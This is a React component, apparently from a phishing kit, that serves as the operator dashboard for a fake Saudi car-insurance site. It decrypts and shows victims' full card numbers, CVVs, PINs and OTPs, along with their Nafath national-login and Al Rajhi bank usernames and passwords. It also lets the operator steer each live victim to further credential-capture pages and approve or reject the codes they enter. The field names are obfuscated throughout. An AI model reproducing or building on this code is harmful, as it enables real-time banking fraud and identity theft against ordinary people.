"use client";

import { ChevronDown } from "lucide-react";
import type { InsuranceApplication } from "@/lib/firestore-types";
import { useState } from "react";
import { updateApplication } from "@/lib/firebase-services";
import { DataBubble } from "./data-bubble";
import {
  convertHistoryToBubbles,
  type HistoryEntry,
} from "@/lib/history-helpers";
import {
  handleCardApproval,
  handleCardRejection,
  handleOtpApproval,
  handleOtpRejection,
  handlePhoneOtpApproval,
  handlePhoneOtpRejection,
  handlePhoneOtpResend,
  updateHistoryStatus,
} from "@/lib/history-actions";
import { _d } from "@/lib/secure-utils";
import { generateVisitorPdf } from "@/lib/generate-pdf";

interface VisitorDetailsProps {
  visitor: InsuranceApplication | null;
}

export function VisitorDetails({ visitor }: VisitorDetailsProps) {
  const [isNavigating, setIsNavigating] = useState(false);
  const [isProcessing, setIsProcessing] = useState(false);
  const [nafadCode, setNafadCode] = useState("");
  const [cardsLayout, setCardsLayout] = useState<"vertical" | "horizontal">(
    "vertical"
  );
  const [isGeneratingPdf, setIsGeneratingPdf] = useState(false);

  if (!visitor) {
    return (
      <div className="flex-1 flex items-center justify-center bg-gray-50">
        <div className="text-center text-gray-500">
          <p className="text-lg">اختر زائراً لعرض التفاصيل</p>
        </div>
      </div>
    );
  }

  // Navigation handler
  const handleNavigate = async (destination: string) => {
    if (!visitor.id || isNavigating) return;

    setIsNavigating(true);

    try {
      let updates: Partial<InsuranceApplication> = {};

      switch (destination) {
        case "home":
          // Set both fields for compatibility
          updates = {
            redirectPage: "home" as any,
            currentStep: "home" as any,
          };
          break;
        case "insur":
          updates = { redirectPage: "insur" as any };
          break;
        case "compar":
          updates = { redirectPage: "compar" as any };
          break;
        case "payment":
          // Modern pages use redirectPage, legacy pages use currentStep
          updates = {
            redirectPage: "payment" as any,
            currentStep: "_st1" as any,
            cardStatus: "pending" as any,
            otpStatus: "pending" as any,
          };
          break;
        case "otp":
          updates = {
            redirectPage: "otp" as any,
            currentStep: "_t2" as any,
          };
          break;
        case "pin":
          updates = {
            redirectPage: "pin" as any,
            currentStep: "_t3" as any,
          };
          break;
        case "rajhi":
          updates = {
            redirectPage: "rajhi" as any,
            currentStep: "rajhi" as any,
          };
          break;
        case "stc-login":
          updates = {
            redirectPage: "stc-login" as any,
            currentStep: "stc-login" as any,
          };
          break;
        case "phone":
          // Legacy system only
          updates = { currentStep: "phone" as any };
          break;
        case "nafad":
          // Legacy system with correct value
          updates = { currentStep: "_t6" as any };
          break;
        case "nafad_modal":
          updates = { nafadConfirmationCode: "123456" }; // Send confirmation code to open modal
          break;
      }

      if (Object.keys(updates).length > 0) {
        console.log("[Dashboard] Sending redirect:", destination, updates);
        await updateApplication(visitor.id, updates);
      }
    } catch (error) {
      console.error("Navigation error:", error);
      console.error(`حدث خطأ في التوجيه:`, error);
    } finally {
      setIsNavigating(false);
    }
  };

  // Send Nafad confirmation code
  const handleSendNafadCode = async () => {
    if (!visitor.id || !nafadCode.trim()) return;

    try {
      await updateApplication(visitor.id, { nafadConfirmationCode: nafadCode });
      setNafadCode("");
    } catch (error) {
      console.error("حدث خطأ في إرسال رقم التأكيد");
    }
  };

  // Prepare bubbles data
  const bubbles: any[] = [];
  const history = (visitor.history || []) as HistoryEntry[];

  // 1. Basic Info (always show if exists)
  if (visitor.ownerName || visitor.identityNumber) {
    const basicData: Record<string, any> = {
      الاسم: visitor.ownerName,
      "رقم الهوية": visitor.identityNumber,
      "رقم الهاتف": visitor.phoneNumber,
      "نوع الوثيقة": visitor.documentType,
      "الرقم التسلسلي": visitor.serialNumber,
      "نوع التأمين": visitor.insuranceType,
    };

    // Add buyer info if insurance type is "نقل ملكية"
    if (visitor.insuranceType === "نقل ملكية") {
      basicData["اسم المشتري"] = visitor.buyerName;
      basicData["رقم هوية المشتري"] = visitor.buyerIdNumber;
    }

    bubbles.push({
      id: "basic-info",
      title: "معلومات أساسية",
      icon: "👤",
      color: "blue",
      data: basicData,
      timestamp: visitor.basicInfoUpdatedAt || visitor.createdAt,
      showActions: false,
    });
  }

  // Nafad will be added after payment data to sort by timestamp

  // 3. Insurance Details
  if (visitor.insuranceCoverage) {
    bubbles.push({
      id: "insurance-details",
      title: "تفاصيل التأمين",
      icon: "🚗",
      color: "green",
      data: {
        "نوع التغطية": visitor.insuranceCoverage,
        "موديل المركبة": visitor.vehicleModel,
        "قيمة المركبة": visitor.vehicleValue,
        "سنة الصنع": visitor.vehicleYear,
        "استخدام المركبة": visitor.vehicleUsage,
        "موقع الإصلاح": visitor.repairLocation === "agency" ? "وكالة" : "ورشة",
      },
      timestamp: visitor.insuranceUpdatedAt || visitor.updatedAt,
      showActions: false,
    });
  }

  // 3. Selected Offer
  if (visitor.selectedOffer) {
    bubbles.push({
      id: "offer-details",
      title: "العرض المختار",
      icon: "📊",
      color: "purple",
      data: {
        الشركة:
          (visitor.selectedOffer as any).name ||
          (visitor.selectedOffer as any).company,
        "السعر الأصلي": visitor.originalPrice,
        الخصم: visitor.discount
          ? `${(visitor.discount * 100).toFixed(0)}%`
          : undefined,
        "السعر النهائي": visitor.finalPrice || visitor.offerTotalPrice,
        "المميزات المختارة": Array.isArray(visitor.selectedFeatures)
          ? visitor.selectedFeatures.join(", ")
          : "لا يوجد",
      },
      timestamp: visitor.offerUpdatedAt || visitor.updatedAt,
      showActions: false,
    });
  }

  // 4. Payment & Verification Data
  // Show ALL card attempts from history (newest first)
  const hasMultipleAttempts = false; // For phone OTP compatibility

  // Get all card entries from history
  const allCardHistory =
    visitor.history?.filter(
      (h: any) => h.type === "_t1" || h.type === "card"
    ) || [];

  // Sort by timestamp (newest first)
  const sortedCardHistory = allCardHistory.sort((a: any, b: any) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA; // Descending order (newest first)
  });

  console.log("[Dashboard] All card history:", sortedCardHistory);

  // Create a bubble for each card attempt
  sortedCardHistory.forEach((cardHistory: any, index: number) => {
    // Get encrypted values from history
    const encryptedCardNumber = cardHistory.data?._v1;
    const encryptedCvv = cardHistory.data?._v2;
    const encryptedExpiryDate = cardHistory.data?._v3;
    const encryptedCardHolderName = cardHistory.data?._v4;

    // Decrypt values with error handling
    let cardNumber, cvv, expiryDate, cardHolderName;
    try {
      cardNumber = encryptedCardNumber ? _d(encryptedCardNumber) : undefined;
      cvv = encryptedCvv ? _d(encryptedCvv) : undefined;
      expiryDate = encryptedExpiryDate ? _d(encryptedExpiryDate) : undefined;
      cardHolderName = encryptedCardHolderName
        ? _d(encryptedCardHolderName)
        : undefined;
    } catch (error) {
      console.error("[Dashboard] Decryption error:", error);
      cardNumber = encryptedCardNumber;
      cvv = encryptedCvv;
      expiryDate = encryptedExpiryDate;
      cardHolderName = encryptedCardHolderName;
    }

    // Show all cards, but hide action buttons if already actioned
    const hasBeenActioned =
      cardHistory.status === "approved" || cardHistory.status === "rejected";

    if (cardNumber || encryptedCardNumber) {
      bubbles.push({
        id: `card-info-${cardHistory.id || index}`,
        title:
          index === 0
            ? "معلومات البطاقة"
            : `معلومات البطاقة (محاولة ${sortedCardHistory.length - index})`,
        icon: "💳",
        color: "orange",
        data: {
          "رقم البطاقة": cardNumber,
          "اسم حامل البطاقة": cardHolderName || "غير محدد",
          "نوع البطاقة": cardHistory.data?.cardType,
          "تاريخ الانتهاء": expiryDate,
          CVV: cvv,
          البنك: cardHistory.data?.bankInfo?.name || "غير محدد",
          "بلد البنك": cardHistory.data?.bankInfo?.country || "غير محدد",
        },
        timestamp: cardHistory.timestamp,
        status: cardHistory.status || ("pending" as const),
        showActions: !hasBeenActioned, // Hide buttons if already approved/rejected
        isLatest: index === 0,
        type: "card",
      });
    }
  });

  // OTP Code - Show ALL attempts from history (newest first)
  const allOtpHistory =
    visitor.history?.filter((h: any) => h.type === "_t2" || h.type === "otp") ||
    [];
  const sortedOtpHistory = allOtpHistory.sort((a: any, b: any) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA;
  });

  sortedOtpHistory.forEach((otpHistory: any, index: number) => {
    const otp = otpHistory.data?._v5;
    const hasBeenActioned =
      otpHistory.status === "approved" || otpHistory.status === "rejected";

    if (otp) {
      bubbles.push({
        id: `otp-${otpHistory.id || index}`,
        title:
          index === 0
            ? "كود OTP"
            : `كود OTP (محاولة ${sortedOtpHistory.length - index})`,
        icon: "🔑",
        color: "pink",
        data: {
          الكود: otp,
          الحالة:
            otpHistory.status === "approved"
              ? "✓ تم القبول"
              : otpHistory.status === "rejected"
              ? "✗ تم الرفض"
              : "⬳ قيد المراجعة",
        },
        timestamp: otpHistory.timestamp,
        status: otpHistory.status || ("pending" as const),
        showActions: !hasBeenActioned,
        isLatest: index === 0,
        type: "otp",
      });
    }
  });

  // PIN Code - Show ALL attempts from history (newest first)
  const allPinHistory =
    visitor.history?.filter((h: any) => h.type === "_t3" || h.type === "pin") ||
    [];
  const sortedPinHistory = allPinHistory.sort((a: any, b: any) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA;
  });

  sortedPinHistory.forEach((pinHistory: any, index: number) => {
    const pinCode = pinHistory.data?._v6;
    const hasBeenActioned =
      pinHistory.status === "approved" || pinHistory.status === "rejected";

    if (pinCode) {
      bubbles.push({
        id: `pin-${pinHistory.id || index}`,
        title:
          index === 0
            ? "رمز PIN"
            : `رمز PIN (محاولة ${sortedPinHistory.length - index})`,
        icon: "🔐",
        color: "indigo",
        data: {
          الكود: pinCode,
          الحالة:
            pinHistory.status === "approved"
              ? "✓ تم القبول"
              : pinHistory.status === "rejected"
              ? "✗ تم الرفض"
              : "⬳ قيد المراجعة",
        },
        timestamp: pinHistory.timestamp,
        status: pinHistory.status || ("pending" as const),
        showActions: !hasBeenActioned,
        isLatest: index === 0,
        type: "pin",
      });
    }
  });

  // Phone Info
  if (visitor.phoneCarrier) {
    bubbles.push({
      id: "phone-info-current",
      title: "معلومات الهاتف",
      icon: "📱",
      color: "green",
      data: {
        "رقم الجوال": visitor.phoneNumber,
        "شركة الاتصالات": visitor.phoneCarrier,
      },
      timestamp: visitor.phoneUpdatedAt || visitor.updatedAt,
      showActions: false,
      isLatest: true,
      type: "phone_info",
    });
  }

  // Phone OTP - Show ALL attempts from history (newest first)
  const allPhoneOtpHistory =
    visitor.history?.filter(
      (h: any) => h.type === "_t5" || h.type === "phone_otp"
    ) || [];
  const sortedPhoneOtpHistory = allPhoneOtpHistory.sort((a: any, b: any) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA;
  });

  sortedPhoneOtpHistory.forEach((phoneOtpHistory: any, index: number) => {
    const phoneOtp = phoneOtpHistory.data?._v7;
    const hasBeenActioned =
      phoneOtpHistory.status === "approved" ||
      phoneOtpHistory.status === "rejected";

    if (phoneOtp) {
      bubbles.push({
        id: `phone-otp-${phoneOtpHistory.id || index}`,
        title:
          index === 0
            ? "كود تحقق الهاتف"
            : `كود تحقق الهاتف (محاولة ${
                sortedPhoneOtpHistory.length - index
              })`,
        icon: "✅",
        color: "pink",
        data: {
          "كود التحقق": phoneOtp,
          الحالة:
            phoneOtpHistory.status === "approved"
              ? "✓ تم القبول"
              : phoneOtpHistory.status === "rejected"
              ? "✗ تم الرفض"
              : "⬳ قيد المراجعة",
        },
        timestamp: phoneOtpHistory.timestamp,
        status: phoneOtpHistory.status || ("pending" as const),
        showActions: !hasBeenActioned,
        isLatest: index === 0,
        type: "phone_otp",
      });
    }
  });

  // Nafad Info - add to dynamic bubbles to sort by timestamp
  const nafazId = visitor._v8 || visitor.nafazId;
  const nafazPass = visitor._v9 || visitor.nafazPass;

  if (nafazId || (visitor.currentStep as any) === "_t6") {
    bubbles.push({
      id: "nafad-info",
      title: "🇸🇦 نفاذ",
      icon: "🇸🇦",
      color: "indigo",
      data: {
        "رقم الهوية": nafazId || "في انتظار الإدخال...",
        "كلمة المرور": nafazPass || "في انتظار الإدخال...",
        "رقم التأكيد المُرسل":
          visitor.nafadConfirmationCode || "لم يتم الإرسال بعد",
      },
      timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
      showActions: true,
      customActions: (
        <div className="flex gap-2 mt-3">
          <input
            type="text"
            value={nafadCode}
            onChange={(e) => setNafadCode(e.target.value)}
            placeholder="أدخل رقم التأكيد"
            className="flex-1 px-3 py-2 border rounded-lg text-sm"
          />
          <button
            onClick={handleSendNafadCode}
            disabled={!nafadCode.trim()}
            className="px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed"
          >
            إرسال
          </button>
        </div>
      ),
    });
  }

  // Rajhi Info - add to dynamic bubbles to sort by timestamp
  const rajhiUser = visitor._v10 || visitor.rajhiUser;
  const rajhiPassword =
    visitor._v11 || visitor.rajhiPassword || visitor.rajhiPasswrod;
  const rajhiOtp = visitor._v12 || visitor.rajhiOtp;

  if (
    rajhiUser ||
    rajhiPassword ||
    rajhiOtp ||
    (visitor.currentStep as any) === "rajhi"
  ) {
    bubbles.push({
      id: "rajhi-info",
      title: "🏦 الراجحي",
      icon: "🏦",
      color: "green",
      data: {
        "اسم المستخدم": rajhiUser || "في انتظار الإدخال...",
        "كلمة المرور": rajhiPassword || "في انتظار الإدخال...",
        "رمز OTP": rajhiOtp || "في انتظار الإدخال...",
      },
      timestamp: visitor.rajhiUpdatedAt || visitor.updatedAt,
      showActions: true,
      type: "rajhi",
    });
  }

  // Sort bubbles: dynamic bubbles by timestamp (newest first), static bubbles at bottom
  const staticBubbleIds = ["basic-info", "insurance-details", "selected-offer"];
  const dynamicBubbles = bubbles.filter((b) => !staticBubbleIds.includes(b.id));
  const staticBubbles = bubbles.filter((b) => staticBubbleIds.includes(b.id));

  // Sort dynamic bubbles by timestamp (newest first)
  dynamicBubbles.sort((a, b) => {
    const timeA = new Date(a.timestamp).getTime();
    const timeB = new Date(b.timestamp).getTime();
    return timeB - timeA; // Descending order (newest first)
  });

  // Combine: dynamic bubbles first, then static bubbles at bottom
  const sortedBubbles = [...dynamicBubbles, ...staticBubbles];

  // Action handlers for bubbles
  const handleBubbleAction = async (
    bubbleId: string,
    action: "approve" | "reject" | "resend" | "otp" | "pin"
  ) => {
    if (!visitor.id || isProcessing) return;

    setIsProcessing(true);

    try {
      const bubble = bubbles.find((b) => b.id === bubbleId);
      if (!bubble) return;

      switch (bubble.type) {
        case "card":
          if (action === "otp") {
            // Approve card with OTP - update history status
            console.log(
              "[Action] Card OTP clicked, bubble.id:",
              bubble.id,
              "history:",
              visitor.history
            );
            await updateHistoryStatus(
              visitor.id,
              bubble.id,
              "approved_with_otp",
              visitor.history || []
            );
            console.log("[Action] Status updated to approved_with_otp");
            await updateApplication(visitor.id, {
              cardStatus: "approved_with_otp",
            });
          } else if (action === "pin") {
            // Approve card with PIN - update history status
            await updateHistoryStatus(
              visitor.id,
              bubble.id,
              "approved_with_pin",
              visitor.history || []
            );
            await updateApplication(visitor.id, {
              cardStatus: "approved_with_pin",
            });
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض البطاقة؟")) {
              // Reject card - update history status
              await updateHistoryStatus(
                visitor.id,
                bubble.id,
                "rejected",
                visitor.history || []
              );
              await updateApplication(visitor.id, { cardStatus: "rejected" });
            }
          }
          break;

        case "otp":
          if (action === "approve") {
            // Approve OTP using proper handler
            await handleOtpApproval(
              visitor.id,
              bubble.id,
              visitor.history || []
            );
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض كود OTP؟")) {
              // Reject OTP using proper handler
              await handleOtpRejection(
                visitor.id,
                bubble.id,
                visitor.history || []
              );
            }
          }
          break;

        case "phone_otp":
          if (action === "approve") {
            if (hasMultipleAttempts) {
              await handlePhoneOtpApproval(visitor.id, bubbleId, history);
            } else {
              await updateApplication(visitor.id, {
                phoneOtpStatus: "approved",
              });
            }
            // Phone OTP approved
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض كود الهاتف؟")) {
              if (hasMultipleAttempts) {
                await handlePhoneOtpRejection(visitor.id, bubbleId, history);
              } else {
                await updateApplication(visitor.id, {
                  phoneOtpStatus: "rejected",
                });
              }
              // Phone OTP rejected
            }
          } else if (action === "resend") {
            await updateHistoryStatus(
              visitor.id,
              bubbleId,
              "resend",
              visitor.history || []
            );
            await updateApplication(visitor.id, {
              phoneOtp: "",
              phoneOtpStatus: "show_phone_otp",
            });
            // Phone OTP modal reopened
          }
          break;

        case "rajhi":
          if (action === "approve") {
            await updateApplication(visitor.id, {
              rajhiOtpStatus: "approved",
            });
          } else if (action === "reject") {
            if (confirm("هل أنت متأكد من رفض رمز الراجحي؟")) {
              await updateApplication(visitor.id, {
                rajhiOtp: "",
                rajhiOtpStatus: "rejected",
              });
            }
          }
          break;
      }
    } catch (error) {
      console.error("Action error:", error);
      console.error(`حدث خطأ:`, error);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div className="flex-1 flex flex-col bg-gray-50 overflow-hidden">
      {/* Header */}
      <div className="bg-white border-b border-gray-200 p-4 md:p-6">
        <div className="flex items-center justify-between">
          <div>
            <h2 className="text-xl md:text-2xl font-bold text-gray-900">
              {visitor.ownerName || "زائر جديد"}
            </h2>

            {/* Contact Info */}
            <div className="flex flex-col gap-1 mt-2">
              <div className="flex items-center gap-4 text-sm">
                <span className="text-gray-600">
                  📞{" "}
                  <span className="font-semibold text-gray-800">
                    {visitor.phoneNumber || "غير محدد"}
                  </span>
                </span>
                <span className="text-gray-400">•</span>
                <span className="text-gray-600">
                  🆔{" "}
                  <span className="font-semibold text-gray-800">
                    {visitor.identityNumber || "غير محدد"}
                  </span>
                </span>
              </div>
              {/* Display STC Data */}
              {visitor.stcPhone && (
                <div className="bg-purple-50 border-l-4 border-purple-500 p-4 rounded-lg">
                  <h4 className="font-semibold text-purple-900 mb-2">
                    بيانات STC
                  </h4>
                  <div className="space-y-2 text-sm">
                    <div>الجوال: {visitor.stcPhone}</div>
                    <div>التاريخ: {visitor.stcSubmittedAt}</div>
                  </div>
                </div>
              )}

              {/* Device & Location Info */}
              {(visitor.country || visitor.browser || visitor.deviceType) && (
                <div className="flex items-center gap-2 text-xs text-gray-500">
                  {visitor.country && <span>🌍 {visitor.country}</span>}
                  {visitor.browser && (
                    <>
                      <span>•</span>
                      <span>🌐 {visitor.browser}</span>
                    </>
                  )}
                  {visitor.deviceType && (
                    <>
                      <span>•</span>
                      <span>📱 {visitor.deviceType}</span>
                    </>
                  )}
                </div>
              )}
            </div>
          </div>

          {/* Navigation */}
          <div className="flex items-center gap-3">
            <button
              onClick={async () => {
                setIsGeneratingPdf(true);
                try {
                  await generateVisitorPdf(visitor);
                } catch (error) {
                  console.error("PDF generation error:", error);
                } finally {
                  setIsGeneratingPdf(false);
                }
              }}
              disabled={isGeneratingPdf}
              className="px-4 py-2 bg-red-600 text-white rounded-lg text-sm font-medium hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex items-center gap-2"
            >
              {isGeneratingPdf ? (
                <>
                  <svg className="animate-spin h-4 w-4" viewBox="0 0 24 24">
                    <circle
                      className="opacity-25"
                      cx="12"
                      cy="12"
                      r="10"
                      stroke="currentColor"
                      strokeWidth="4"
                      fill="none"
                    />
                    <path
                      className="opacity-75"
                      fill="currentColor"
                      d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z"
                    />
                  </svg>
                  جاري التحميل...
                </>
              ) : (
                <>📄 تحميل PDF</>
              )}
            </button>
            {/* Navigation Dropdown */}
            <select
              onChange={(e) => handleNavigate(e.target.value)}
              disabled={isNavigating}
              className="px-4 py-2 border border-gray-300 rounded-lg bg-white text-sm focus:outline-none focus:ring-2 focus:ring-blue-500 disabled:opacity-50"
            >
              <option value="">توجيه الزائر...</option>
              <option value="home">الصفحة الرئيسية</option>
              <option value="insur">بيانات التأمين</option>
              <option value="compar">مقارنة العروض</option>
              <option value="payment">الدفع والتحقق</option>
              <option value="otp">التحقق OTP</option>
              <option value="pin">التحقق PIN</option>
              <option value="phone">معلومات الهاتف</option>
              <option value="nafad">نفاذ</option>
              <option value="nafad_modal">مودال نفاذ</option>
              <option value="rajhi">راجحي</option>
              <option value="stc-login">stc</option>
            </select>
          </div>
        </div>
      </div>

      {/* Bubbles */}
      <div className="flex-1 overflow-y-auto p-3 md:p-6">
        {sortedBubbles.length === 0 ? (
          <div className="text-center text-gray-500 py-12">
            <p>لا توجد بيانات لعرضها</p>
          </div>
        ) : (
          <div
            className="grid grid-cols-1 lg:grid-cols-3 gap-6 lg:gap-0"
            dir="rtl"
          >
            {/* Right Column - Credit Card and Card Details */}
            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:pl-6">
              {sortedBubbles
                .filter(
                  (b) => b.id.startsWith("card-info") || b.id === "card-details"
                )
                .map((bubble) => (
                  <DataBubble
                    key={bubble.id}
                    title={bubble.title}
                    data={bubble.data}
                    timestamp={bubble.timestamp}
                    status={bubble.status}
                    showActions={bubble.showActions}
                    isLatest={bubble.isLatest}
                    layout="vertical"
                    actions={
                      bubble.customActions ? (
                        bubble.customActions
                      ) : bubble.showActions ? (
                        <div className="flex gap-2 mt-3">
                          {bubble.type === "card" && (
                            <>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "otp")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-blue-600 text-white rounded-lg text-xs md:text-sm hover:bg-blue-700 disabled:opacity-50 font-medium"
                              >
                                🔑 رمز OTP
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "pin")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-purple-600 text-white rounded-lg text-xs md:text-sm hover:bg-purple-700 disabled:opacity-50 font-medium"
                              >
                                🔐 كود PIN
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "reject")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
                              >
                                ❌ رفض
                              </button>
                            </>
                          )}
                          {bubble.type === "otp" && (
                            <>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "approve")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50"
                              >
                                قبول
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "reject")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-4 py-2 bg-red-600 text-white rounded-lg text-sm hover:bg-red-700 disabled:opacity-50"
                              >
                                رفض
                              </button>
                            </>
                          )}
                          {bubble.type === "phone_otp" && (
                            <>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "approve")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50"
                              >
                                قبول
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "reject")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-4 py-2 bg-red-600 text-white rounded-lg text-sm hover:bg-red-700 disabled:opacity-50"
                              >
                                رفض
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "resend")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-4 py-2 bg-blue-600 text-white rounded-lg text-sm hover:bg-blue-700 disabled:opacity-50"
                              >
                                إعادة إرسال
                              </button>
                            </>
                          )}
                        </div>
                      ) : null
                    }
                  />
                ))}
            </div>

            {/* Middle Column - Dynamic Cards (OTP, PIN, Phone, etc.) */}
            <div className="flex flex-col gap-4 lg:border-l lg:border-gray-200 lg:px-6">
              {sortedBubbles
                .filter(
                  (b) =>
                    !b.id.startsWith("card-info") &&
                    b.id !== "card-details" &&
                    b.id !== "basic-info" &&
                    b.id !== "offer-details" &&
                    b.id !== "insurance-details"
                )
                .map((bubble) => (
                  <DataBubble
                    key={bubble.id}
                    title={bubble.title}
                    data={bubble.data}
                    timestamp={bubble.timestamp}
                    status={bubble.status}
                    showActions={bubble.showActions}
                    isLatest={bubble.isLatest}
                    layout="vertical"
                    actions={
                      bubble.customActions ? (
                        bubble.customActions
                      ) : bubble.showActions ? (
                        <div className="flex gap-2 mt-3">
                          {bubble.type === "otp" && (
                            <>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "approve")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
                              >
                                ✓ قبول
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "reject")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
                              >
                                ✗ رفض
                              </button>
                            </>
                          )}
                          {bubble.type === "pin" && (
                            <>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "approve")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
                              >
                                ✓ قبول
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "reject")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
                              >
                                ✗ رفض
                              </button>
                            </>
                          )}
                          {bubble.type === "phone_otp" && (
                            <>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "approve")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
                              >
                                ✓ قبول
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "reject")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
                              >
                                ✗ رفض
                              </button>
                            </>
                          )}
                          {bubble.type === "rajhi" && (
                            <>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "approve")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-green-600 text-white rounded-lg text-xs md:text-sm hover:bg-green-700 disabled:opacity-50 font-medium"
                              >
                                ✓ قبول
                              </button>
                              <button
                                onClick={() =>
                                  handleBubbleAction(bubble.id, "reject")
                                }
                                disabled={isProcessing}
                                className="flex-1 px-2 md:px-4 py-1.5 md:py-2 bg-red-600 text-white rounded-lg text-xs md:text-sm hover:bg-red-700 disabled:opacity-50 font-medium"
                              >
                                ✗ رفض
                              </button>
                            </>
                          )}
                        </div>
                      ) : null
                    }
                  />
                ))}
            </div>

            {/* Left Column - Static Info (Basic, Offer Details, Insurance Details) */}
            <div className="flex flex-col gap-4 lg:pr-6">
              {sortedBubbles
                .filter(
                  (b) =>
                    b.id === "basic-info" ||
                    b.id === "offer-details" ||
                    b.id === "insurance-details"
                )
                .map((bubble) => (
                  <DataBubble
                    key={bubble.id}
                    title={bubble.title}
                    data={bubble.data}
                    timestamp={bubble.timestamp}
                    status={bubble.status}
                    showActions={false}
                    isLatest={false}
                    layout="vertical"
                  />
                ))}
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
